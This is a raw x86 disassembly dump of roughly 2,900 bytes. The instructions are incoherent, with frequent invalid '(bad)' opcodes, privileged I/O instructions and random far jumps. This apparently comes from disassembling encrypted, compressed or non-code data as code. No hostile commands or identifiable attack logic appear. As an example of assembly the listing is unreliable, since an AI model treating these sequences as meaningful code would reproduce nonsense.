  41dc4d:	rcl    BYTE PTR [edi-0x22],1
  41dc50:	daa    
  41dc51:	retf   0xb7ac
  41dc54:	jns    0x41dcb8
  41dc56:	inc    ecx
  41dc57:	shr    DWORD PTR [edi+0x9328390],cl
  41dc5d:	xchg   ebx,eax
  41dc5e:	outs   dx,DWORD PTR ds:[esi]
  41dc5f:	loop   0x41dc1b
  41dc61:	aaa    
  41dc62:	dec    esp
  41dc63:	xor    ecx,eax
  41dc65:	mov    BYTE PTR ds:0x513b9194,dl
  41dc6b:	add    eax,esi
  41dc6d:	inc    eax
  41dc6e:	pop    edi
  41dc6f:	adc    bl,dh
  41dc71:	sub    eax,0x4ec2f3f0
  41dc76:	add    dh,bl
  41dc78:	pop    es
  41dc79:	jb     0x41dc0f
  41dc7b:	and    al,0xa
  41dc7d:	test   BYTE PTR [esi+edi*4+0x2ddeb78f],0xbc
  41dc85:	(bad)  
  41dc86:	push   esi
  41dc87:	outs   dx,DWORD PTR ds:[esi]
  41dc88:	xor    DWORD PTR [ebp-0x8],esp
  41dc8b:	data16 (bad) 
  41dc8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc8e:	sub    ecx,ebp
  41dc90:	cmp    edx,DWORD PTR [ecx-0x43]
  41dc93:	or     BYTE PTR [ecx],ch
  41dc95:	fsubr  DWORD PTR [edi-0x4318921e]
  41dc9b:	xchg   edx,eax
  41dc9c:	inc    edi
  41dc9d:	jbe    0x41dc3b
  41dc9f:	adc    eax,0x23253b78
  41dca4:	rcr    BYTE PTR [ebp-0x3d65b28],1
  41dcaa:	inc    edi
  41dcab:	dec    edx
  41dcac:	xchg   ecx,eax
  41dcad:	xchg   edi,eax
  41dcae:	dec    ecx
  41dcaf:	sar    DWORD PTR [edi+0x3169c17d],1
  41dcb5:	mov    ds:0xd4fd943b,al
  41dcba:	div    DWORD PTR [ebx]
  41dcbc:	jp     0x41dcfe
  41dcbe:	adc    DWORD PTR ds:0xb6008ab5,esp
  41dcc4:	out    dx,eax
  41dcc5:	fdiv   QWORD PTR [edi-0x71]
  41dcc8:	adc    eax,0x3a992281
  41dccd:	icebp  
  41dcce:	rcr    BYTE PTR fs:[edi-0x674acf7],cl
  41dcd5:	cmc    
  41dcd6:	mov    cl,0xfc
  41dcd8:	and    DWORD PTR [ebp+0x1b8a0a0b],eax
  41dcde:	jge    0x41dca9
  41dce0:	dec    esp
  41dce1:	lods   al,BYTE PTR ds:[esi]
  41dce2:	and    edx,DWORD PTR [eax+0x58]
  41dce5:	iret   
  41dce6:	lock cdq 
  41dce8:	cmp    al,0xd6
  41dcea:	sbb    esi,DWORD PTR [ebx-0x364decfb]
  41dcf0:	(bad)  
  41dcf1:	mov    dl,0xf0
  41dcf3:	xor    al,0xef
  41dcf5:	cs mov ebx,0xda939d7c
  41dcfb:	sbb    al,0x46
  41dcfd:	pop    ecx
  41dcfe:	es jge 0x41dc91
  41dd01:	inc    eax
  41dd02:	ja     0x41dd00
  41dd04:	addr16 jmp 0x86f822b3
  41dd0a:	jb     0x41dd1d
  41dd0c:	leave  
  41dd0d:	outs   dx,DWORD PTR ds:[esi]
  41dd0e:	shl    DWORD PTR [edx-0x5c1fd984],cl
  41dd14:	sbb    cl,ch
  41dd16:	add    BYTE PTR [edi],dl
  41dd18:	sub    ebp,ecx
  41dd1a:	bound  ebp,QWORD PTR [ebx]
  41dd1c:	dec    esp
  41dd1d:	and    BYTE PTR [esi],bh
  41dd1f:	mov    ah,0x89
  41dd21:	inc    edi
  41dd22:	aad    0xbf
  41dd24:	out    0xff,eax
  41dd26:	push   esi
  41dd27:	icebp  
  41dd28:	retf   0xd52d
  41dd2b:	mov    al,ds:0x1a20878c
  41dd30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd31:	dec    ebx
  41dd32:	ror    BYTE PTR [eax-0xe76f2c2],0x49
  41dd39:	in     eax,0x76
  41dd3b:	push   eax
  41dd3c:	push   0xffffffae
  41dd3e:	add    DWORD PTR [eax-0x4252e699],eax
  41dd44:	sahf   
  41dd45:	sbb    ebp,DWORD PTR [edx]
  41dd47:	push   esp
  41dd48:	mov    al,0x57
  41dd4a:	mov    dl,0x33
  41dd4c:	in     eax,dx
  41dd4d:	sti    
  41dd4e:	mov    ah,0xb
  41dd50:	sar    BYTE PTR [ecx+0x7b],0x67
  41dd54:	into   
  41dd55:	mov    gs,WORD PTR [ecx+0x58310901]
  41dd5b:	jecxz  0x41dce5
  41dd5d:	test   DWORD PTR [ecx],esp
  41dd5f:	push   ds
  41dd60:	iret   
  41dd61:	(bad)  
  41dd62:	and    eax,0xbefd93ae
  41dd67:	sbb    edx,0xa82b4165
  41dd6d:	dec    ebx
  41dd6e:	adc    al,0xfd
  41dd70:	fcom   DWORD PTR [eax+0x6f]
  41dd73:	xor    eax,0x1095d811
  41dd78:	mov    cl,0x7b
  41dd7a:	lea    ebp,[ebx-0x1a851228]
  41dd80:	arpl   sp,bp
  41dd82:	call   0xcad8:0xefbfe8f2
  41dd89:	shl    DWORD PTR ds:0x51b6e1a5,0xee
  41dd90:	outs   dx,DWORD PTR ds:[esi]
  41dd91:	inc    esp
  41dd92:	jp     0x41dddd
  41dd94:	xlat   BYTE PTR ds:[ebx]
  41dd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd96:	jg     0x41dd97
  41dd98:	push   ss
  41dd99:	sbb    BYTE PTR [edx+esi*4-0x1a367044],al
  41dda0:	pop    esp
  41dda1:	and    esi,DWORD PTR [esp+eax*2-0x7d5fe042]
  41dda8:	mov    al,0x42
  41ddaa:	adc    BYTE PTR [eax-0x2f18b57c],ah
  41ddb0:	rol    BYTE PTR ds:0xcfc7d30,0xcf
  41ddb7:	add    eax,0x2e2ccb97
  41ddbc:	cmp    eax,0xb9654658
  41ddc1:	sub    BYTE PTR [ebx],0xe2
  41ddc4:	jnp    0x41de2a
  41ddc6:	xchg   ebx,eax
  41ddc7:	in     al,0xad
  41ddc9:	jb     0x41de18
  41ddcb:	adc    al,0x91
  41ddcd:	inc    esi
  41ddce:	push   ss
  41ddcf:	mov    bh,0xb4
  41ddd1:	adc    al,0x50
  41ddd3:	xchg   ebp,eax
  41ddd4:	into   
  41ddd5:	(bad)  
  41ddd6:	loopne 0x41ddea
  41ddd8:	inc    eax
  41ddd9:	xchg   ecx,eax
  41ddda:	cmp    bl,BYTE PTR [ecx]
  41dddc:	not    DWORD PTR [ebp-0x10af0447]
  41dde2:	out    0xa4,al
  41dde4:	jb     0x41ddc6
  41dde6:	and    ebx,DWORD PTR [esi+0x319c15c2]
  41ddec:	adc    BYTE PTR [esi],bh
  41ddee:	push   ss
  41ddef:	and    DWORD PTR [ebx-0x30],edi
  41ddf2:	fsub   QWORD PTR [ebp+0x4eca974c]
  41ddf8:	jbe    0x41dd9f
  41ddfa:	push   eax
  41ddfb:	imul   ebp,DWORD PTR [ecx-0xaccf635],0x2e
  41de02:	iret   
  41de03:	xor    edx,DWORD PTR [ebx-0x6a]
  41de06:	cld    
  41de07:	pop    esp
  41de08:	mov    ebp,0x157f3ea1
  41de0d:	mov    ebp,0x69894f7
  41de12:	dec    edi
  41de13:	mov    ah,BYTE PTR ss:[edx-0x35]
  41de17:	mov    edi,0x61c75f8
  41de1c:	(bad)  
  41de1f:	xchg   edx,eax
  41de20:	lds    esp,FWORD PTR [eax+0x5c]
  41de23:	fs sahf 
  41de25:	cmp    DWORD PTR [edi-0x5a],edi
  41de28:	pop    edi
  41de29:	xlat   BYTE PTR ds:[ebx]
  41de2a:	in     eax,dx
  41de2b:	jmp    0x41de3e
  41de2d:	sbb    eax,0x7c9e3bdc
  41de32:	and    ch,BYTE PTR [ecx]
  41de34:	ds repz jecxz 0x41dea2
  41de38:	pop    es
  41de39:	dec    eax
  41de3a:	push   edi
  41de3b:	add    ecx,DWORD PTR [esi]
  41de3d:	xchg   ebx,eax
  41de3e:	not    DWORD PTR [edi-0x4]
  41de41:	sbb    DWORD PTR [eax-0x6f7fae9b],0x7e23e4e5
  41de4b:	loop   0x41de3c
  41de4d:	xor    DWORD PTR [ecx+0x6a25af20],0x7b54fff4
  41de57:	outs   dx,BYTE PTR ds:[esi]
  41de58:	xchg   ecx,eax
  41de59:	je     0x41ddf5
  41de5b:	mov    bl,0x7a
  41de5d:	fs ja  0x41de24
  41de60:	push   esp
  41de61:	sub    DWORD PTR [ecx-0x18],ecx
  41de64:	jg     0x41de7f
  41de66:	shl    BYTE PTR [edi],0x27
  41de69:	fist   WORD PTR [ebx+0x76309089]
  41de6f:	mov    bl,0x52
  41de71:	cs inc esp
  41de73:	hlt    
  41de74:	rcl    BYTE PTR [edx+eax*4+0x33],1
  41de78:	mov    ebp,0x3ee2f4d1
  41de7d:	in     eax,dx
  41de7e:	push   ds
  41de7f:	daa    
  41de80:	mov    ecx,0x2f3e730a
  41de85:	dec    esi
  41de86:	xchg   DWORD PTR [esi-0x506fb16e],ecx
  41de8c:	scas   eax,DWORD PTR es:[edi]
  41de8d:	fs sub al,0x75
  41de90:	leave  
  41de91:	test   eax,0x9e89cf5e
  41de96:	xor    edi,DWORD PTR [eax-0x38]
  41de99:	cs mov ebp,0x7be0698b
  41de9f:	out    0x2,al
  41dea1:	idiv   DWORD PTR [edi-0x11]
  41dea4:	dec    eax
  41dea5:	mov    al,ds:0x59bf8d62
  41deaa:	push   0x3d
  41deac:	mov    edx,0xb6d055be
  41deb1:	cmp    BYTE PTR [edx+0x44],0x9f
  41deb5:	pop    esp
  41deb6:	mov    eax,ds:0x728cae6
  41debb:	pop    ss
  41debc:	xchg   edx,eax
  41debd:	mov    dl,0xd3
  41debf:	in     al,0x53
  41dec1:	test   esi,edx
  41dec3:	mov    BYTE PTR [esi+0x5f416302],ah
  41dec9:	(bad)
  41decd:	push   cs
  41dece:	push   ds
  41decf:	stos   BYTE PTR es:[edi],al
  41ded0:	push   eax
  41ded1:	fisubr WORD PTR [esi+0x1519fc75]
  41ded7:	adc    al,0x1c
  41ded9:	out    0xeb,eax
  41dedb:	pop    es
  41dedc:	inc    ebp
  41dedd:	fstp   st(1)
  41dedf:	dec    ebp
  41dee0:	sbb    ebp,esp
  41dee2:	inc    edx
  41dee3:	fucomip st,st(5)
  41dee5:	pop    esi
  41dee6:	mov    ebp,0x2b118193
  41deeb:	pop    DWORD PTR [ebp-0x2bf64ae2]
  41def1:	xor    edx,0xc08924cc
  41def7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def8:	push   esp
  41def9:	(bad)  
  41defa:	sbb    dl,cl
  41defc:	inc    esi
  41defd:	add    al,0x72
  41deff:	jo     0x41dee4
  41df01:	es repz and eax,0x324a1b41
  41df08:	mov    eax,ds:0x175d39ea
  41df0d:	cmp    BYTE PTR [ebx+0x22],ah
  41df10:	(bad)  
  41df11:	lods   eax,DWORD PTR ds:[esi]
  41df12:	xchg   ecx,eax
  41df13:	enter  0x4125,0xdc
  41df17:	sbb    ecx,esp
  41df19:	dec    esi
  41df1a:	rol    BYTE PTR [ebx+0x3],0x75
  41df1e:	data16 ss and al,0x93
  41df22:	inc    ebp
  41df23:	push   esi
  41df24:	popf   
  41df25:	in     al,0x49
  41df27:	adc    eax,0x38e2671b
  41df2c:	test   esp,0x3a318ed5
  41df32:	sbb    BYTE PTR [ebp-0xa3d5566],ch
  41df38:	jae    0x41df9d
  41df3a:	out    dx,al
  41df3b:	stos   DWORD PTR es:[edi],eax
  41df3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df3d:	or     al,cl
  41df3f:	call   0x5d0f9af8
  41df44:	or     eax,0x4acfef98
  41df49:	pop    ebx
  41df4a:	iret   
  41df4b:	xor    DWORD PTR [eax-0x47758999],esp
  41df51:	push   0x53
  41df53:	or     eax,0xcbd9a9f8
  41df58:	test   al,0x83
  41df5a:	shl    BYTE PTR [edx+0x66],0x74
  41df5e:	retf   0x80af
  41df61:	add    dl,al
  41df63:	lock jno 0x41df55
  41df66:	mov    esp,0xacf89684
  41df6b:	jmp    0x41df9a
  41df6d:	shl    BYTE PTR [edi+0x4c9fcbb8],1
  41df73:	push   ebx
  41df75:	and    BYTE PTR [ecx-0x42],0x65
  41df79:	mov    WORD PTR [eax+0x3b],gs
  41df7c:	pop    edi
  41df7d:	out    0x21,eax
  41df7f:	lods   eax,DWORD PTR ds:[esi]
  41df80:	arpl   WORD PTR [ecx+eax*8+0x6ed90ec0],si
  41df87:	add    al,0x20
  41df89:	and    cl,BYTE PTR [ecx-0x53]
  41df8c:	or     eax,0x78b2e834
  41df91:	push   cs
  41df92:	popf   
  41df93:	inc    edi
  41df94:	loope  0x41df2c
  41df96:	lods   eax,DWORD PTR ds:[esi]
  41df97:	jle    0x41df25
  41df99:	xchg   ebp,eax
  41df9a:	mov    eax,DWORD PTR [ebx]
  41df9c:	or     dh,bh
  41df9e:	pop    ebx
  41df9f:	loop   0x41df7a
  41dfa1:	inc    edx
  41dfa2:	ja     0x41dfda
  41dfa4:	sub    eax,0xedd544ba
  41dfa9:	sub    al,0xd9
  41dfab:	call   0x77f8:0xd2ac8564
  41dfb2:	outs   dx,DWORD PTR ds:[esi]
  41dfb3:	cmp    al,0x1c
  41dfb5:	icebp  
  41dfb6:	or     eax,DWORD PTR [ebp+0x6f]
  41dfb9:	mov    cs,ebx
  41dfbb:	mov    WORD PTR [esp+esi*8+0x73],gs
  41dfbf:	ds inc ebx
  41dfc1:	xchg   ecx,eax
  41dfc2:	mov    ebx,0xe3b94017
  41dfc7:	cld    
  41dfc8:	add    bh,BYTE PTR [edx]
  41dfca:	imul   DWORD PTR [esi-0x29b9d1b3]
  41dfd0:	xchg   BYTE PTR [ecx-0x3d420e10],bh
  41dfd6:	pop    ss
  41dfd7:	xchg   edi,eax
  41dfd8:	push   0xcce33b42
  41dfdd:	push   es
  41dfde:	ret    
  41dfdf:	push   ds
  41dfe0:	cmp    DWORD PTR [ebp+0x1dcf5dcd],ebp
  41dfe6:	or     al,0x4b
  41dfe8:	enter  0xd495,0x40
  41dfec:	jb     0x41dfba
  41dfee:	pop    ss
  41dfef:	jns    0x41df7c
  41dff1:	rcr    cl,cl
  41dff3:	xchg   edi,eax
  41dff4:	cld    
  41dff5:	stc    
  41dff6:	sbb    esi,DWORD PTR [eax]
  41dff8:	xchg   ecx,eax
  41dff9:	dec    edx
  41dffa:	shl    BYTE PTR [eax],0x81
  41dffd:	mov    al,0xa4
  41dfff:	mov    esi,0x3e885f90
  41e004:	xchg   esi,eax
  41e005:	dec    ch
  41e007:	fist   DWORD PTR [esi]
  41e009:	loop   0x41dfb3
  41e00b:	sub    eax,0x5d168fe
  41e010:	repnz dec ecx
  41e012:	(bad)
  41e016:	pop    edi
  41e017:	jns    0x41e02b
  41e019:	sub    BYTE PTR [ebx+0x72aea9f5],ch
  41e01f:	gs bnd ja 0x41e079
  41e023:	stos   BYTE PTR es:[edi],al
  41e024:	lods   eax,DWORD PTR ds:[esi]
  41e025:	mov    bl,0x6f
  41e027:	aas    
  41e028:	or     edx,DWORD PTR [esi+0x13e96e]
  41e02e:	jne    0x41dfdc
  41e030:	inc    ecx
  41e031:	xchg   ebp,eax
  41e032:	scas   eax,DWORD PTR es:[edi]
  41e033:	cmp    bl,al
  41e035:	jns    0x41dfd3
  41e037:	adc    al,0xc6
  41e039:	jmp    0x72598e4
  41e03e:	mov    ah,0xf3
  41e040:	fbstp  TBYTE PTR [ebx+0x2f]
  41e043:	xor    ecx,DWORD PTR [eax+0x18]
  41e046:	or     eax,0xb80ed15e
  41e04b:	xchg   esi,eax
  41e04c:	stos   BYTE PTR es:[edi],al
  41e04d:	jp     0x41e072
  41e04f:	add    al,0xfb
  41e051:	add    eax,0xd59b9856
  41e056:	sbb    esp,DWORD PTR [edx]
  41e058:	lods   al,BYTE PTR ds:[esi]
  41e059:	xor    eax,0x9533b66
  41e05e:	sbb    DWORD PTR [edi-0x5],ecx
  41e061:	rcr    BYTE PTR [edi+0x2ee472e0],cl
  41e067:	mov    ebx,0x1191f6b8
  41e06c:	dec    ebp
  41e06d:	fdiv   DWORD PTR [ecx]
  41e06f:	xor    bl,BYTE PTR [eax+edx*4]
  41e072:	and    al,0x2f
  41e074:	cmp    BYTE PTR [ebx],0xa2
  41e077:	lea    esp,[edx+0x1fa16bef]
  41e07d:	sub    al,0xa3
  41e07f:	adc    ch,0xf0
  41e082:	mov    BYTE PTR [ebx-0xb4a1913],dl
  41e088:	xchg   esi,eax
  41e089:	push   ecx
  41e08a:	and    eax,0xc1bde907
  41e08f:	int    0x0
  41e091:	enter  0x9c39,0xa1
  41e095:	fcmovbe st,st(1)
  41e097:	xchg   esp,eax
  41e098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e099:	mov    ecx,DWORD PTR [esp+edx*8-0x68f3225e]
  41e0a0:	dec    esp
  41e0a1:	or     BYTE PTR [esp+edx*1-0xbf05c51],0xb6
  41e0a9:	(bad)  [edi+0x2d]
  41e0ac:	(bad)  
  41e0ad:	and    eax,DWORD PTR [edx]
  41e0af:	inc    esp
  41e0b0:	aas    
  41e0b1:	js     0x41e0c0
  41e0b3:	imul   esi,DWORD PTR [ebp-0x46823b10],0xcc9f9bbb
  41e0bd:	mov    fs,WORD PTR [ebx+0x65e9434d]
  41e0c3:	adc    al,0xca
  41e0c5:	jecxz  0x41e089
  41e0c7:	ret    0x4977
  41e0ca:	fidiv  DWORD PTR [esi+eax*1]
  41e0cd:	pushf  
  41e0ce:	sbb    eax,0x6d62b836
  41e0d3:	outs   dx,BYTE PTR ds:[esi]
  41e0d4:	mov    al,ds:0xd6975f09
  41e0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0da:	dec    edx
  41e0db:	out    dx,eax
  41e0dc:	xchg   ebx,eax
  41e0dd:	pop    ds
  41e0de:	push   esp
  41e0df:	jg     0x41e085
  41e0e1:	jecxz  0x41e150
  41e0e3:	inc    edi
  41e0e4:	sbb    eax,0xcad2bb6a
  41e0e9:	lea    edx,[ebp+0x37]
  41e0ec:	sbb    esi,ebx
  41e0ee:	inc    eax
  41e0ef:	pushf  
  41e0f0:	xor    al,BYTE PTR [ecx]
  41e0f2:	jnp    0x41e161
  41e0f4:	pop    edi
  41e0f5:	push   0xe698028c
  41e0fa:	adc    al,0xc
  41e0fc:	mov    ebx,0x5e3c30a8
  41e101:	outs   dx,DWORD PTR ds:[esi]
  41e102:	mov    eax,ds:0xed5cc3eb
  41e107:	scas   eax,DWORD PTR es:[edi]
  41e108:	push   edi
  41e109:	fucomi st,st(5)
  41e10b:	sub    BYTE PTR [eax+0x2befe3c3],cl
  41e111:	sub    BYTE PTR [esi+0x45],0x36
  41e115:	mov    esi,0x6b063d8d
  41e11a:	mov    edx,0x16359020
  41e11f:	sbb    al,0xa0
  41e121:	cs xchg esi,eax
  41e123:	dec    esp
  41e124:	out    0x21,al
  41e126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e127:	cli    
  41e128:	test   DWORD PTR [ebx-0x5e],esp
  41e12b:	cld    
  41e12c:	sub    al,BYTE PTR [ecx+edi*8]
  41e12f:	sub    al,0xe5
  41e131:	loopne 0x41e170
  41e133:	xor    ebp,DWORD PTR [esi]
  41e135:	out    dx,eax
  41e136:	xor    cl,dl
  41e138:	unpcklps xmm3,xmm4
  41e13b:	jns    0x41e1a9
  41e13d:	test   al,0x2e
  41e13f:	(bad)  
  41e141:	clc    
  41e142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e143:	sahf   
  41e144:	dec    ebx
  41e145:	push   edi
  41e146:	cdq    
  41e147:	mov    WORD PTR [ecx],ds
  41e149:	and    eax,0x519dbcd7
  41e14e:	js     0x41e1cd
  41e150:	test   al,0xd4
  41e152:	dec    esi
  41e153:	sbb    cl,dl
  41e155:	push   edx
  41e156:	in     al,dx
  41e157:	repz mov ebp,0x8e28c395
  41e15d:	pop    esp
  41e15e:	retf   
  41e15f:	mov    bh,ch
  41e161:	ret    
  41e162:	add    edi,DWORD PTR [esi+0x36]
  41e165:	push   0x18
  41e167:	aaa    
  41e168:	es retf 0x8a42
  41e16c:	sar    BYTE PTR ds:0xea18740,0x62
  41e173:	test   BYTE PTR [esi-0x25203297],0xaa
  41e17a:	in     al,dx
  41e17b:	mov    ds:0x4793b9eb,eax
  41e180:	add    DWORD PTR [ecx+0x76d70ad9],edi
  41e186:	mov    ebp,0x66a879bf
  41e18b:	mov    cl,0x11
  41e18d:	lods   eax,DWORD PTR ds:[esi]
  41e18e:	or     dl,ch
  41e190:	jecxz  0x41e138
  41e192:	std    
  41e193:	xchg   ebp,eax
  41e194:	jge    0x41e1fa
  41e196:	call   0x8e8a:0xc5807977
  41e19d:	mov    BYTE PTR [ebx-0x43],bl
  41e1a0:	stc    
  41e1a1:	mov    dh,0x87
  41e1a3:	dec    edx
  41e1a4:	call   0x24a4:0x324c606d
  41e1ab:	xlat   BYTE PTR ds:[ebx]
  41e1ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1ad:	add    DWORD PTR [ebp-0x31a97c04],ecx
  41e1b3:	sahf   
  41e1b4:	and    DWORD PTR [esi-0x54],esp
  41e1b7:	jge    0x41e209
  41e1b9:	loop   0x41e208
  41e1bb:	add    ebx,ebx
  41e1bd:	daa    
  41e1be:	sub    esp,eax
  41e1c0:	jno    0x41e147
  41e1c2:	adc    BYTE PTR [ecx],dh
  41e1c4:	(bad)  
  41e1c5:	fstp   QWORD PTR [edx+edx*2+0x24]
  41e1c9:	in     al,0x41
  41e1cb:	cvtdq2ps xmm1,xmm1
  41e1ce:	mov    ebp,0x369176b1
  41e1d3:	loope  0x41e1fe
  41e1d5:	(bad)  
  41e1d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d7:	xchg   edx,eax
  41e1d8:	or     eax,DWORD PTR [eax]
  41e1da:	in     al,dx
  41e1db:	aam    0xaf
  41e1dd:	dec    edi
  41e1de:	xor    al,0x9a
  41e1e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1e1:	int    0x45
  41e1e3:	fcmovne st,st(0)
  41e1e5:	push   esp
  41e1e6:	adc    DWORD PTR [edx+0x40],ebp
  41e1e9:	mov    ebp,0x51734c2
  41e1ee:	push   ebx
  41e1ef:	xchg   DWORD PTR [esi],esi
  41e1f1:	pop    ds
  41e1f2:	mov    ebp,0xad2ee76d
  41e1f7:	loopne 0x41e18d
  41e1f9:	and    al,0xad
  41e1fb:	test   DWORD PTR [esi+0x42],edi
  41e1fe:	les    eax,FWORD PTR ds:0xae297714
  41e204:	push   ecx
  41e205:	sbb    ch,cl
  41e207:	mov    ebx,0xcc690e0e
  41e20c:	out    0x4,al
  41e20e:	(bad)  
  41e20f:	nop
  41e210:	dec    edx
  41e211:	jmp    0xc029:0x77fea3b9
  41e218:	test   BYTE PTR [esi],0xf3
  41e21b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e21d:	jne    0x41e1b6
  41e21f:	dec    edx
  41e220:	test   al,0x96
  41e222:	adc    DWORD PTR [esi+ebx*4+0xd],ecx
  41e226:	leave  
  41e227:	xor    eax,0x3446ca9d
  41e22c:	fsubr  DWORD PTR [edi-0x55]
  41e22f:	sahf   
  41e230:	dec    edi
  41e231:	cmp    BYTE PTR [esi],0x42
  41e234:	dec    ebx
  41e235:	inc    esi
  41e236:	and    cl,BYTE PTR [esi-0x10]
  41e239:	in     al,0xca
  41e23b:	stos   BYTE PTR es:[edi],al
  41e23c:	test   al,0xfd
  41e23e:	cmp    eax,0x506859cf
  41e243:	dec    edi
  41e244:	stos   DWORD PTR es:[edi],eax
  41e245:	out    0x96,eax
  41e247:	pop    edi
  41e248:	aas    
  41e249:	les    edx,FWORD PTR fs:[edx+0x9]
  41e24d:	jno    0x41e2ba
  41e24f:	pop    ecx
  41e250:	push   ecx
  41e251:	and    al,0x2b
  41e253:	sahf   
  41e254:	int    0x1e
  41e256:	dec    eax
  41e257:	dec    ebp
  41e258:	jne    0x41e260
  41e25a:	and    al,0x35
  41e25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e25d:	(bad)  
  41e25e:	jno    0x41e25a
  41e260:	dec    ebx
  41e261:	ret    0x4976
  41e264:	mov    ds:0x1a222b02,eax
  41e269:	jno    0x41e252
  41e26b:	jnp    0x41e209
  41e26d:	je     0x41e2b7
  41e26f:	out    0x9a,eax
  41e271:	(bad)  
  41e272:	(bad)  
  41e273:	push   0x22bce977
  41e278:	jno    0x41e2e0
  41e27a:	out    dx,al
  41e27b:	ja     0x41e216
  41e27d:	dec    eax
  41e27e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e27f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e280:	ins    BYTE PTR es:[edi],dx
  41e281:	mov    edx,0xb1983e0e
  41e286:	cmp    eax,0xa5f78b51
  41e28b:	dec    ecx
  41e28c:	dec    esi
  41e28d:	inc    esi
  41e28e:	mov    al,0x91
  41e290:	jg     0x41e2c9
  41e292:	ja     0x41e2f3
  41e294:	je     0x41e27c
  41e296:	rcr    eax,0x95
  41e299:	push   cs
  41e29a:	scas   al,BYTE PTR es:[edi]
  41e29b:	test   ebp,edi
  41e29d:	inc    ebp
  41e29e:	sbb    eax,DWORD PTR [esi+0x480f7991]
  41e2a4:	inc    ebp
  41e2a5:	mov    edi,0x1f98e7f1
  41e2aa:	mov    BYTE PTR [esi],dl
  41e2ac:	ret    
  41e2ad:	dec    ebp
  41e2ae:	in     al,0x50
  41e2b0:	stos   DWORD PTR es:[edi],eax
  41e2b1:	pop    es
  41e2b2:	jge    0x41e23b
  41e2b4:	outs   dx,BYTE PTR ds:[esi]
  41e2b5:	gs mov dh,0xfa
  41e2b8:	adc    cl,dh
  41e2ba:	shl    DWORD PTR [edx-0x7b],1
  41e2bd:	lods   eax,DWORD PTR ds:[esi]
  41e2be:	(bad)  
  41e2bf:	mov    ch,0xf9
  41e2c1:	mov    ch,0xd2
  41e2c3:	outs   dx,DWORD PTR ds:[esi]
  41e2c4:	push   es
  41e2c5:	jg     0x41e2f8
  41e2c7:	jle    0x41e2e6
  41e2c9:	xor    al,0x0
  41e2cb:	inc    esi
  41e2cc:	push   ebp
  41e2cd:	scas   eax,DWORD PTR es:[edi]
  41e2ce:	mov    ebp,fs
  41e2d0:	pop    ecx
  41e2d1:	or     ebp,DWORD PTR [edi]
  41e2d3:	adc    ebp,DWORD PTR [ebp+0xe]
  41e2d6:	mov    ebp,ds
  41e2d8:	dec    edi
  41e2d9:	dec    esp
  41e2da:	mov    cl,0x82
  41e2dc:	xor    esi,edi
  41e2de:	mov    esi,0x3656efd0
  41e2e3:	scas   al,BYTE PTR es:[edi]
  41e2e4:	ins    DWORD PTR es:[edi],dx
  41e2e5:	fwait
  41e2e6:	stos   BYTE PTR es:[edi],al
  41e2e7:	dec    edi
  41e2e8:	pusha  
  41e2e9:	lods   eax,DWORD PTR ds:[esi]
  41e2ea:	lea    esi,[esi+0x2b]
  41e2ed:	pop    edx
  41e2ee:	js     0x41e33f
  41e2f0:	dec    esi
  41e2f1:	es jmp 0x41e2ef
  41e2f4:	(bad)  
  41e2f5:	sub    al,0xa
  41e2f7:	jmp    0x41e34e
  41e2f9:	mov    edx,0x45136b27
  41e2fe:	xchg   ebp,eax
  41e2ff:	lods   al,BYTE PTR ds:[esi]
  41e300:	cmc    
  41e301:	inc    esi
  41e302:	adc    al,0x7
  41e304:	out    dx,al
  41e305:	jno    0x41e33b
  41e307:	es daa 
  41e309:	mov    ah,BYTE PTR [edi]
  41e30b:	(bad)  
  41e30c:	cmp    BYTE PTR [edx-0x65f9b740],cl
  41e312:	mov    ds:0xce4865b2,eax
  41e317:	sub    eax,0xd53e2e77
  41e31c:	add    BYTE PTR [edi],0x7b
  41e31f:	mov    ah,0x55
  41e321:	cmp    ecx,DWORD PTR [ecx+0x18]
  41e324:	scas   al,BYTE PTR es:[edi]
  41e325:	stos   BYTE PTR es:[edi],al
  41e326:	ret    
  41e327:	mov    bl,0xde
  41e329:	hlt    
  41e32a:	outs   dx,DWORD PTR ds:[esi]
  41e32b:	sub    DWORD PTR [ebx-0x34],edi
  41e32e:	adc    cl,ah
  41e330:	pop    esi
  41e331:	daa    
  41e332:	pop    edx
  41e333:	mov    ah,0x5b
  41e335:	jle    0x41e3a3
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	in     eax,dx
  41e339:	mov    edi,DWORD PTR [esi]
  41e33b:	and    dl,BYTE PTR [eax+0x52]
  41e33e:	std    
  41e33f:	lods   al,BYTE PTR ds:[esi]
  41e340:	push   0x6a243f15
  41e345:	hlt    
  41e346:	out    0xbb,al
  41e348:	mov    eax,0x1ec18af0
  41e34d:	mov    dh,BYTE PTR [edx+0x4c559926]
  41e353:	mov    cl,0x9e
  41e355:	cmc    
  41e356:	jp     0x41e3ca
  41e358:	jg     0x41e309
  41e35a:	and    eax,DWORD PTR [eax+0x53]
  41e35d:	shl    DWORD PTR [esi],cl
  41e35f:	rcr    DWORD PTR [ebx-0x5f53d029],0xac
  41e366:	sub    DWORD PTR [eax-0x27cd045b],edx
  41e36c:	cli    
  41e36d:	mov    eax,0xd177b290
  41e372:	adc    DWORD PTR [edi+0x4],edx
  41e375:	outs   dx,DWORD PTR ds:[esi]
  41e376:	xor    DWORD PTR [edi+edi*8-0x72],edi
  41e37a:	mov    ecx,0x91643bad
  41e37f:	mov    bl,0x2
  41e381:	jecxz  0x41e342
  41e383:	jo     0x41e3c1
  41e385:	hlt    
  41e386:	das    
  41e387:	xlat   BYTE PTR ds:[ebx]
  41e388:	(bad)  
